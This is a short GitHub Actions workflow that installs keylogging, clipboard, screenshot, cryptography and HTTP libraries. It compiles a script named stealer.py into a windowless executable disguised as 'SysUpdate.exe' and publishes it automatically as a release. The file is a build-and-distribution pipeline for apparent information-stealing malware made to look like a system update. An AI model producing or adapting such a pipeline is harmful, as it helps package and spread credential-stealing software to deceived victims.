name: build
on:
  workflow_dispatch:
  push: {branches: [main]}
jobs:
  b:
    runs-on: windows-latest
    permissions: {contents: write}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: {python-version: '3.12'}
      - run: pip install pywin32 cryptography pillow pyperclip requests pynput pyinstaller
      - run: pyinstaller --onefile --noconsole --name SysUpdate stealer.py
      - uses: softprops/action-gh-release@v2
        with:
          tag_name: v${{ github.run_number }}
          files: dist/SysUpdate.exe
